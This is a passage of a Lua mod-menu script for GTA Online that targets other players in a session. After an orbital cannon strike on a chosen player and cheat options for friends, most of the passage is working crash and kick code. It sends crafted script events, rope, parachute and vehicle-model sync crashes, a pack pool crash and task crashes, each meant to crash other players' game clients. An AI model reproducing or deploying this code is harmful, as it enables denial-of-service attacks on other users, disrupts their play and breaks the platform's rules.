		scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE("ORBITAL_CANNON_CAM")
		while not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleform) do
			wait()
		end

		GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_ZOOM_LEVEL")
		GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(1.0)
		GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

		gSound.activating:stop()
		gSound.backgroundLoop:play()
		AUDIO.PLAY_SOUND_FRONTEND(-1, "cannon_active", "dlc_xm_orbital_cannon_sounds", true);
		
		local countdown = 3 -- seconds
		local counting = false
		local sTime
		local state = 0
		local chargeLvl = 1.0
		local targetCamHeight = height

		while true do
			wait()
			PAD.DISABLE_CONTROL_ACTION(2, 75, true)

			local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(gCannonTarget)
			local pos = ENTITY.GET_ENTITY_COORDS(targetPed)
			STREAMING.SET_FOCUS_POS_AND_VEL(pos.x, pos.y, pos.z, 5.0, 0.0, 0.0)
			CAM.SET_CAM_COORD(cam, pos.x, pos.y, pos.z + 150)
			HUD.DISPLAY_RADAR(false)
			disablePhone()

			local hudColour = ENTITY.IS_ENTITY_DEAD(targetPed) and HudColour.greyDrak or HudColour.red
			drawLockonSprite(targetPed, hudColour)

			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_STATE")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(3)
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			if state == 0 then
				if PAD.IS_DISABLED_CONTROL_PRESSED(0, 69) then
					if not counting then
						startTime = cTime()
						gSound.fireLoop:play()
						counting = true
					end
					if coutdown ~= 0 then
						if (cTime() - startTime) >= 1000 then
							countdown = countdown - 1
							startTime = cTime()
						end

						GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_COUNTDOWN")
						GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(countdown)
						GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
					end
				else
					AUDIO.SET_VARIABLE_ON_SOUND(gSound.fireLoop.Id, "Firing", 0.0);
					gSound.fireLoop:stop()
					counting = false
					countdown = 3
				end

				set_cannon_cam_zoom()
				if countdown == 0 then
					gSound.fireLoop:stop()
					state = 1
				end
			elseif state == 1 then
				chargeLvl = 0.0
				local effect = Effect.new("scr_xm_orbital", "scr_xm_orbital_blast")
				STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)
				while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) do
					wait()
				end

				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "DLC_XM_Explosions_Orbital_Cannon", pos.x, pos.y, pos.z, 0, true, 0, false)
				CAM.SHAKE_CAM(cam, "GAMEPLAY_EXPLOSION_SHAKE", 1.5)
				
				sTime = cTime()
				state = 2
			elseif state == 2 and (cTime() - sTime) > 1000 then
				CAM.DO_SCREEN_FADE_OUT(500)
				sTime = cTime()
				state = 3
			elseif state == 3 and (cTime() - sTime) > 600 then
				break
			end
			
			-- terminates the loop when
			-- 1) the target leaves session
			-- 2) F button is just pressed
			if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(gCannonTarget) or PAD.IS_DISABLED_CONTROL_JUST_PRESSED(2, 75) then
				sTime = cTime()
				state = 2
			end
			
			if instructional:begin() then
				instructional.add_control(75, "BB_LC_EXIT")
				instructional.add_control(69, "ORB_CAN_FIRE")
				if PAD._IS_USING_KEYBOARD(0) then
					instructional.add_control_group(29, "ORB_CAN_ZOOM")
				end
        		instructional:set_background_colour(0, 0, 0, 80)
        		instructional:draw()
			end

			PAD.DISABLE_CONTROL_ACTION(2, 85, true)
			HUD._HUD_WEAPON_WHEEL_IGNORE_SELECTION()

			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_CHARGING_LEVEL")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(chargeLvl)
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			GRAPHICS.SET_SCRIPT_GFX_DRAW_ORDER(0)
			GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleform, 255, 255, 255, 255, 0)
			GRAPHICS.RESET_SCRIPT_GFX_ALIGN()
		end
		
		gSound.backgroundLoop:stop()
		ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
		PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_ID(), false)
		menu.trigger_commands("becomeorbitalcannon off")

		GRAPHICS.ANIMPOSTFX_STOP("MP_OrbitalCannon")
		AUDIO.STOP_AUDIO_SCENE("dlc_xm_orbital_cannon_camera_active_scene")
		AUDIO.RELEASE_NAMED_SCRIPT_AUDIO_BANK("DLC_CHRISTMAS2017/XM_ION_CANNON")
		
		CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, false, 0)
		CAM.SET_CAM_ACTIVE(cam, false)
		CAM.DESTROY_CAM(cam, false)
		HUD.DISPLAY_RADAR(true)
		STREAMING.CLEAR_FOCUS()
		wait(800)
		CAM.DO_SCREEN_FADE_IN(500)
		
		gUsingOrbitalCannon = false
	end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
	--FRIENDS OPT
	
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

    menu.slider(friendoptions, "Speed", {"speed"}, "Default = 0", 0, 99999999, 0, 1, function(on_change)
        local vehicle = get_player_veh(pid)
        if vehicle == nul then return end
        if vehicle then
        requestControlLoop(vehicle)
            VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, on_change) 
        end
    end)

    menu.toggle(friendoptions, "Veh God Mode", {"gmveh"}, "Make transport immortal.", function(toggle)
        local vehicle = get_player_veh(pid)
        if vehicle then
            requestControlLoop(vehicle)
        if toggle then
            VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, 0.0)
            VEHICLE.SET_VEHICLE_BODY_HEALTH(vehicle, 1000.0)
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, 1000.0)
            VEHICLE.SET_VEHICLE_FIXED(vehicle)
            VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(vehicle)
            VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(vehicle, 1000.0)
            VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, 0.0)
            for i = 0, 10 do
                VEHICLE.SET_VEHICLE_TYRE_FIXED(vehicle, i)
            end
        end
        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, toggle)
        ENTITY.SET_ENTITY_PROOFS(vehicle, toggle, toggle, toggle, toggle, toggle, toggle, 1, toggle)
        VEHICLE.SET_DISABLE_VEHICLE_PETROL_TANK_DAMAGE(vehicle, toggle)
        VEHICLE.SET_DISABLE_VEHICLE_PETROL_TANK_FIRES(vehicle, toggle)
        VEHICLE.SET_VEHICLE_CAN_BE_VISIBLY_DAMAGED(vehicle, not toggle)
        VEHICLE.SET_VEHICLE_CAN_BREAK(vehicle, not toggle)
        VEHICLE.SET_VEHICLE_ENGINE_CAN_DEGRADE(vehicle, not toggle)
        VEHICLE.SET_VEHICLE_EXPLODES_ON_HIGH_EXPLOSION_DAMAGE(vehicle, not toggle)
        VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, not toggle)
        VEHICLE.SET_VEHICLE_WHEELS_CAN_BREAK(vehicle, not toggle)
        end
    end)

    menu.toggle(friendoptions, "Veh Invisible", {"invveh"}, "Скрыть траспорт.", function(toggle)
        local vehicle = get_player_veh(pid)
        if vehicle then
            requestControlLoop(vehicle)
            ENTITY.SET_ENTITY_VISIBLE(vehicle, not toggle, false)
        end
    end)

    menu.toggle_loop(friendoptions, "Auto Repair Vehicle", {"Autorep"}, "Morgen fix my MaFinka!", function(toggle)
        local veh = get_player_veh(pid)
        local hpveh = ENTITY.GET_ENTITY_HEALTH(veh)
        local maxhpveh = ENTITY.GET_ENTITY_MAX_HEALTH(veh)
        if veh == NILL then return end
        if hpveh < maxhpveh then
            VEHICLE.SET_VEHICLE_FIXED(veh)
            VEHICLE.SET_VEHICLE_DIRT_LEVEL(veh, 0.0)
        end
    end)

    menu.toggle_loop(friendoptions, "Infinity Ammo", {"Autoammo"}, "Endless ammo", function(toggle)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local weaphash = WEAPON.GET_SELECTED_PED_WEAPON(ped)
        local ammo = WEAPON.GET_AMMO_IN_PED_WEAPON(ped, weaphash)
        if ammo < 9999 then
            WEAPON.ADD_AMMO_TO_PED(ped, weaphash, 9999)
        end
    end)


    menu.action(friendoptions, "Repair Vehicle", {"Repveh"}, "Repair a player's vehicle", function(on_click)
        local vehicle = get_player_veh(pid)
        if vehicle then
            VEHICLE.SET_VEHICLE_FIXED(vehicle)
        end
    end)

    menu.action(friendoptions, "Clean Vehicle", {"cleanveh"}, "Wash the vehicle for the player", function(on_click)
        local vehicle = get_player_veh(pid)
        if vehicle then
            VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, 0.0)
        end
    end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
	--MODMENUS CRASHESH
	
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--[[    menu.click_slider(menuscrash,"Crash - 0xCheats", {}, "Script Events Crash", 1, 2, 1 , 1, function(s)
        if pid ~= players.user() then
            rg = math.random(461950868, 999999999)
            par1 = math.random(-100000, 99999999)
		    par2 = math.random(-4827432, 3231229)
		    par3 = math.random(46190868, 999999999)
		    par4 = math.random(-133223, 42746729)
		    par5 = math.random(-999999999, 428747628)
            par6 = math.random(-2147483647, 2147483647)
            par7 = math.random(-1986324736, 1747413822)
            par8 = math.random(-1986324736, 1777712108)
            par9 = math.random(-1673857408, 1780088064)
            par10 = math.random(-2588888790, 2100146067)
            if s == 1 then
                trigger_script_event(1 << pid,{962740265, pid, pid, 30583, pid, pid, pid, pid, -328966, 10128444})
            elseif s == 2 then
                trigger_script_event(1 << pid,{-1386010354, pid, 2147483647, 2147483647, pid, 30583, pid, pid, pid, pid, -328966, 10128444})
            end
        end
    end)

    menu.click_slider(menuscrash,"Crash - xForce Basic", {}, "Script Events Crash", 1, 4, 1, 1, function(s)
        if pid ~= players.user() then
            rg = math.random(461950868, 999999999)
            par1 = math.random(-100000, 99999999)
		    par2 = math.random(-4827432, 3231229)
		    par3 = math.random(46190868, 999999999)
		    par4 = math.random(-133223, 42746729)
		    par5 = math.random(-999999999, 428747628)
            par6 = math.random(-2147483647, 2147483647)
            par7 = math.random(-1986324736, 1747413822)
            par8 = math.random(-1986324736, 1777712108)
            par9 = math.random(-1673857408, 1780088064)
            par10 = math.random(-2588888790, 2100146067)
            if s == 1 then
                trigger_script_event(1 << pid,{962740265, pid, 95398, 98426, -24591, 47901, -64814})
            elseif s == 2 then
                trigger_script_event(1 << pid,{962740265, pid, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            elseif s == 3 then
                trigger_script_event(1 << pid,{-1386010354, pid, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            elseif s == 4 then
                trigger_script_event(1 << pid,{677240627, pid, -1774405356})
            end
        end
    end)

    menu.click_slider(menuscrash,"Crash - Cherax", {}, "Script Events Crash, Cherax Crash Or Crash Cherax? Don't look at me it was russian.", 1, 2, 1 , 1, function(s)
        if pid ~= players.user() then
            rg = math.random(461950868, 999999999)
            par1 = math.random(-100000, 99999999)
	        par2 = math.random(-4827432, 3231229)
	        par3 = math.random(46190868, 999999999)
	        par4 = math.random(-133223, 42746729)
	        par5 = math.random(-999999999, 428747628)
            par6 = math.random(-2147483647, 2147483647)
            par7 = math.random(-1986324736, 1747413822)
            par8 = math.random(-1986324736, 1777712108)
            par9 = math.random(-1673857408, 1780088064)
            par10 = math.random(-2588888790, 2100146067)
            if s == 1 then
                trigger_script_event(1 << pid,{-1386010354, pid, 2147483647, 2147483647, 23243, 5332, 3324, pid})
            elseif s == 2 then
                trigger_script_event(1 << pid,{962740265, pid, 23243, 5332, 3324, pid})
            end
        end
    end)

    menu.action(menuscrash, "Kick - Phantom X", {}, "Script Event Kick", function(on_click)
        if pid ~= players.user() then
            rg = math.random(461950868, 999999999)
            par1 = math.random(-100000, 99999999)
	        par2 = math.random(-4827432, 3231229)
	        par3 = math.random(46190868, 999999999)
	        par4 = math.random(-133223, 42746729)
	        par5 = math.random(-999999999, 428747628)
            par6 = math.random(-2147483647, 2147483647)
            par7 = math.random(-1986324736, 1747413822)
            par8 = math.random(-1986324736, 1777712108)
            par9 = math.random(-1673857408, 1780088064)
            par10 = math.random(-2588888790, 2100146067)
            if s == 1 then
                trigger_script_event(1 << pid,{1189947075, pid, 1204112514})
            end
        end
    end)
]]--
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
	--SESSION CRASHESH
	
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------	

    menu.click_slider(sescrash,"Rope Crash", {}, " V1= Virgin V2= :D V3= Math", 1, 3, 1, 1, function(s)
        if s == 1 then
            local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            cargobob = entities.create_vehicle(2132890591, pos, 0)
            cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
            vehicle = entities.create_vehicle(410882957,pos,0)
            vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle)
            ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
            local newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, "Center")
            PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, vehicle, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, vehicle_pos.x, vehicle_pos.y, vehicle_pos.z, 2, 0, 0, "Center", "Center")
            wait(100)
            toast("Ready")
        elseif s == 2 then
            local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            pos.x = pos.x+2
            newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, "Center")
            entities.create_vehicle(410882957,pos,0)
        elseif s == 3 then
            local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            pos.x = pos.x+5
            ppos.z = ppos.z+1
            cargobob = entities.create_vehicle(2132890591, pos, 0)
            cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
            kur = entities.create_ped(26, 2727244247, ppos, 0)
            kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
            ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
            local newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
            PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
            wait(2000)
            entities.delete(kur)
            entities.delete(newRope)
            entities.delete(cargobob)
            toast("Ready")
        end
    end)

   --[[ menu.click_slider(sescrash,"Stelth model Sync", {}, "Model sync crash(do not use v2 when you are a host)", 1, 2, 1, 1, function(s)
        if s == 1 then
            trigger_command("Msync")
        elseif s == 2 then
            trigger_command("icms")
        end
    end)]]--

    menu.click_slider(sescrash,"Invalid Parachute Crash", {}, "Crash synchronized parachute -> an object. V1 Transport V2 Player V3 modified", 1, 3, 1, 1, function(s)
        if s == 1 then  
            trigger_command("parcrash")
        elseif s == 2 then
               local playername = PLAYER.GET_PLAYER_NAME(pid)
            local player_ped = PLAYER.PLAYER_PED_ID()
            local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
trigger_command("anticrashcamera on")
            WEAPON.GIVE_WEAPON_TO_PED(PLAYER.PLAYER_PED_ID(), -72657034, 1, true, true)
            trigger_command("levitate on")
            trigger_command("godmode on")
            trigger_command("grace on")
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 1889091531)
            trigger_command("wp" .. playername .. " on")
            trigger_command("wp" .. playername .. " off")
            wait(100)
            trigger_command("tpwp")
            trigger_command("parachute 8")
            trigger_command("parachutevar 0")
            trigger_command("levitate off")
            wait(100)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), 446.9146, 5571.7847, 900.1893)
            wait(10)
            TASK.TASK_PARACHUTE(PLAYER.PLAYER_ID(), true, true)
            wait(50)
            TASK.TASK_PARACHUTE(PLAYER.PLAYER_ID(), true, true)
            wait(10)
            TASK.TASK_PARACHUTE(PLAYER.PLAYER_ID(), true, true)
            wait(50)
            TASK.TASK_PARACHUTE(PLAYER.PLAYER_ID(), true, true)
            wait(10)
            TASK.TASK_PARACHUTE(PLAYER.PLAYER_ID(), true, true)
            wait(50)
            TASK.TASK_PARACHUTE(PLAYER.PLAYER_ID(), true, true)
            wait(10)
            TASK.TASK_PARACHUTE(PLAYER.PLAYER_ID(), true, true)
            wait(50)
            TASK.TASK_PARACHUTE(PLAYER.PLAYER_ID(), true, true)
            wait(10)
            TASK.TASK_PARACHUTE(PLAYER.PLAYER_ID(), true, true)
            wait(50)
            TASK.TASK_PARACHUTE(PLAYER.PLAYER_ID(), true, true)
            wait(7000)
            trigger_command("godmode off")
            trigger_command("grace off")
            trigger_command("wp" .. playername .. " off")
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
            PLAYER.CLEAR_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
trigger_command("anticrashcamera off")
            toast("Ready")
        elseif s == 3 then
local user = players.user_ped()
            local playername = PLAYER.GET_PLAYER_NAME(pid)
            trigger_command("levitate on")
            trigger_command("godmode on")
            trigger_command("grace on")
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 1889091531)
            trigger_command("wp" .. playername .. " on")
            trigger_command("wp" .. playername .. " off")
            wait(100)
            trigger_command("tpwp")
            trigger_command("levitate off")
trigger_command("godmode off")
            trigger_command("grace off")
            wait(100)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), 446.9146, 5571.7847, 781.1893)
           trigger_command("drpack on")
            wait(500)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 0x675D244E)
 wait(500)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 0x799B48CA)
 wait(500)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 0x68E49D4D)
 wait(500)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 0x66F34017)
 wait(500)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 0xC4C9551E)
wait(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
wait(500)
ENTITY.SET_ENTITY_HEALTH(user, 0)
     wait(100)
trigger_command("drpack off")       
            toast("Ready")
        end
    end)

    menu.action(sescrash, "Network Sound Crash", {}, "Sound crash does not work on people in interiors.", function(on_click)
        trigger_command("Sound Crash") 
        toast("Ready")
    end)		  

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
	--SYNC CRASHES
	
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------	
	
	synctree = menu.list(crashes, "Sync Crashes", {}, "Crash sync.", function(); end)
	
	menu.action(synctree, "Trailer --> automobile", {}, "Classic crash sync (changes the hash of a spawned vehicle of one type to another and teleports to the target, thus causing the game to crash). Blocked by most paid cheats.", function(on_click)
	    local myped = PLAYER.PLAYER_PED_ID()
        local mypos = ENTITY.GET_ENTITY_COORDS(myped)
		local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local playername = PLAYER.GET_PLAYER_NAME(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
		trigger_command("vehspawndrive on")
        trigger_command("cablecar")
        trigger_command("vehspawndrive off")
wait(1000)
		local veh = PED.GET_VEHICLE_PED_IS_USING(myped)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x + 1000, mypos.y + 1000, mypos.z + 1000, false, true, true)
        trigger_command("forgemodel on")
		wait(1000)
       trigger_command("wp" .. playername .. " on")
            trigger_command("wp" .. playername .. " off")
            wait(100)
            trigger_command("tpwp")
        wait(3000)		
        trigger_command("forgemodel off")
        trigger_command("deletevehicle")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, true, true) 
		wait()
        toast("Ready")	
	end)		  
	
    menu.action(synctree, "Plane --> Automobile", {}, "Classic crash sync (changes the hash of a spawned vehicle of one type to another and teleports to the target, thus causing the game to crash). Blocked by most paid cheats.", function(on_click)
	    local myped = PLAYER.PLAYER_PED_ID()
 local playername = PLAYER.GET_PLAYER_NAME(pid)
        local mypos = ENTITY.GET_ENTITY_COORDS(myped)
		local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
		trigger_command("vehspawndrive on")
        trigger_command("cargoplane")
        trigger_command("vehspawndrive off")
wait(1000)
		local veh = PED.GET_VEHICLE_PED_IS_USING(myped)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, mypos.x + 1000, mypos.y + 1000, mypos.z + 1000, false, true, true)
        trigger_command("forgemodel on")
		wait(1000)
        trigger_command("wp" .. playername .. " on")
            trigger_command("wp" .. playername .. " off")
            wait(100)
            trigger_command("tpwp")
        trigger_command("forgemodel off")
        trigger_command("deletevehicle")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, true, true) 
		wait()
        toast("Ready")	
	end)		  
	
	menu.action(synctree, "Heli --> Automobile", {}, "Classic crash sync (changes the hash of a spawned vehicle of one type to another and teleports to the target, thus causing the game to crash). Blocked by most paid cheats.", function(on_click)
	    local myped = PLAYER.PLAYER_PED_ID()
        local mypos = ENTITY.GET_ENTITY_COORDS(myped)
 local playername = PLAYER.GET_PLAYER_NAME(pid)
		local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
		trigger_command("vehspawndrive on")
        trigger_command("buzzard")
        trigger_command("vehspawndrive off")
wait(1000)
		local veh = PED.GET_VEHICLE_PED_IS_USING(myped)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, mypos.x + 1000, mypos.y + 1000, mypos.z + 1000, false, true, true)
        trigger_command("forgemodel on")
		wait(1000)
        trigger_command("wp" .. playername .. " on")
            trigger_command("wp" .. playername .. " off")
            wait(100)
            trigger_command("tpwp")
        wait(3000)		
        trigger_command("forgemodel off")
        trigger_command("deletevehicle")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, true, true) 
		wait()
        toast("Ready")	
	end)		  
	
	menu.action(synctree, "Bike --> Automobile", {}, "Classic crash sync (changes the hash of a spawned vehicle of one type to another and teleports to the target, thus causing the game to crash). Blocked by most paid cheats.", function(on_click)
	    local myped = PLAYER.PLAYER_PED_ID()
 local playername = PLAYER.GET_PLAYER_NAME(pid)
        local mypos = ENTITY.GET_ENTITY_COORDS(myped)
		local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
		trigger_command("vehspawndrive on")
        trigger_command("shotaro")
        trigger_command("vehspawndrive off")
wait(1000)
		local veh = PED.GET_VEHICLE_PED_IS_USING(myped)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, mypos.x + 1000, mypos.y + 1000, mypos.z + 1000, false, true, true)
        trigger_command("forgemodel on")
		wait(1000)
        trigger_command("wp" .. playername .. " on")
            trigger_command("wp" .. playername .. " off")
            wait(100)
            trigger_command("tpwp")
        wait(3000)		
        trigger_command("forgemodel off")
        trigger_command("deletevehicle")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, true, true) 
		wait()
        toast("Ready")	
	end)		  
	
	menu.action(synctree, "Boat --> Automobile", {}, "Classic crash sync (changes the hash of a spawned vehicle of one type to another and teleports to the target, thereby causing the game to crash). Blocked by most paid cheats.", function(on_click)
	    local myped = PLAYER.PLAYER_PED_ID()
 local playername = PLAYER.GET_PLAYER_NAME(pid)
        local mypos = ENTITY.GET_ENTITY_COORDS(myped)
		local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
		trigger_command("vehspawndrive on")
        trigger_command("dinghy")
        trigger_command("vehspawndrive off")
wait(1000)
		local veh = PED.GET_VEHICLE_PED_IS_USING(myped)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, mypos.x + 1000, mypos.y + 1000, mypos.z + 1000, false, true, true)
        trigger_command("forgemodel on")
		wait(1000)
        trigger_command("wp" .. playername .. " on")
            trigger_command("wp" .. playername .. " off")
            wait(100)
            trigger_command("tpwp")
wait(3000)
        trigger_command("forgemodel off")
        trigger_command("deletevehicle")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, true, true) 
		wait()
        toast("Ready")	
	end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
	--Pack Pool Crash
	
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local PackPoolCrash = false
    menu.toggle(crashes, "Pack Pool Crash", {"DrpackCrash"}, "Recommend to use on foot.", function(toggle)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        trigger_command("testsafe on")
wait(10)
        trigger_command("godmode on")
wait(10)
        trigger_command("otr on")
wait(10)
        trigger_command("invisibility on")
wait(10)
        trigger_command("Dropaq on")
wait(10)
        PackPoolCrash = toggle
        while PackPoolCrash do
            ENTITY.ATTACH_ENTITY_TO_ENTITY(PLAYER.PLAYER_PED_ID(), p, 0, 0, 0, 0, 0, 0, 0, false, true, false, false, 0, true)
              trigger_command("mpfemale")
            wait(25)
            trigger_command("mpmale")
            wait(25)
            if not players.exists(pid) then
                PackPoolCrash = false
            end
        end
        ENTITY.DETACH_ENTITY(PLAYER.PLAYER_PED_ID(), true, false)
        trigger_command("godmode off")
wait(10)
        trigger_command("otr off")
wait(10)
        trigger_command("invisibility off")
wait(10)
        trigger_command("suicide")
wait(10)
        trigger_command("outfitdefault")
wait(10)
        trigger_command("Dropaq off")
wait(10)
        toast("Ready") 
    end)


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
	--TASKS CRASHES
	
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
	menu.click_slider(crashes, "Task Crash", {}, "Only crashes people in the vehicle", 1, 4, 1, 1, function(s)
	    local ped = PLAYER.GET_PLAYER_PED(pid)
        if PED.IS_PED_IN_ANY_VEHICLE(ped) then
            if s == 1 then
                local veh = PED.GET_VEHICLE_PED_IS_USING(ped)
                TASK.TASK_VEHICLE_TEMP_ACTION(ped, veh, 16, 1000)
                toast("Ready")
            elseif s == 2 then
                local veh = PED.GET_VEHICLE_PED_IS_USING(ped)
                TASK.TASK_VEHICLE_TEMP_ACTION(ped, veh, 17, 1000)
                toast("Ready")
            elseif s == 3 then
                local veh = PED.GET_VEHICLE_PED_IS_USING(ped)
                TASK.TASK_VEHICLE_TEMP_ACTION(ped, veh, 18, 1000)
                toast("Ready")
 elseif s == 4 then
local ped = PLAYER.GET_PLAYER_PED(pid)
TASK.TASK_LOOK_AT_COORD(ped, -6170.0, 10837.0, 40.0, 10 , true, true)
toast("Ready")
            end
        end
    end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
	--HOST CRASH
	
